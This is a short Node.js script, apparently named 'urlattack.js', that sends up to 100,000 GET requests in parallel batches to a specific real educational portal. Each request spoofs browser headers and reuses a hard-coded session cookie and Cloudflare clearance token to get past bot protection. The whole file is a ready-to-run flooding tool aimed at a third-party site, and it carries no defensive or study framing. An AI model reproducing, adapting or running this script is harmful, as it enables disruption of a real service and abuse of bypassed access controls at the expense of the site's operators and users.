import axios from 'axios';

const GetUrl = async (count) => {

let config = {
  method: 'get',
  maxBodyLength: Infinity,
  url: 'https://ais.tact.ac.in/ais/index.jsp',
  headers: { 
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 
    'accept-language': 'en-GB,en;q=0.9', 
    'cache-control': 'max-age=0', 
    'priority': 'u=0, i', 
    'sec-ch-ua': '"Chromium";v="142", "Brave";v="142", "Not_A Brand";v="99"', 
    'sec-ch-ua-mobile': '?0', 
    'sec-ch-ua-platform': '"macOS"', 
    'sec-fetch-dest': 'document', 
    'sec-fetch-mode': 'navigate', 
    'sec-fetch-site': 'none', 
    'sec-fetch-user': '?1', 
    'sec-gpc': '1', 
    'upgrade-insecure-requests': '1', 
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36', 
    'Cookie': 'JSESSIONID=0C74AF2C96F0D8E20ABB327A6B25C413; cf_clearance=cGHz1UnL89gnjySd9TkbR.h_f1ktVT4c1YDYwQGRABY-1762441702-1.2.1.1-CMAeRrVFJ3Q52nOpXilPOFv4XtKi2IWQpdkUMFr3RGDoQK3dKLwBTJtM4Bqv37BUY9s6nnRC7aRwY5boeqqRy5QpWdVwcOzisYsjE9u8n0jzRECmP9nNY1V1fMBXI0K0NerI9ImH3q.Qeylzl7MMwcuuyF1FQSGdT3bZRlleEIK6Sd7R.u1GDECxSGbKK6ZK51w.5eDL80DLxOmps2.BEOYJO7rWOoMZOF2FshWsdCA'
  }
};

axios.request(config)
.then((response) => {
  console.log(JSON.stringify(response.data));
})
.catch((error) => {
  console.log(error);
});
}

async function main() {
  for (let i = 0; i < 10000; i++) { // Reduce to test
    console.log(`Batch ${i}`);
    const p = [];
    for (let j = 0; j < 10; j++) {
      p.push(GetUrl(i * 10 + j));
    }
    await Promise.all(p);
    await new Promise(res => setTimeout(res, 2000));  //2 sec
  }
}


main();

// node --max-old-space-size=4096 urlattack.js
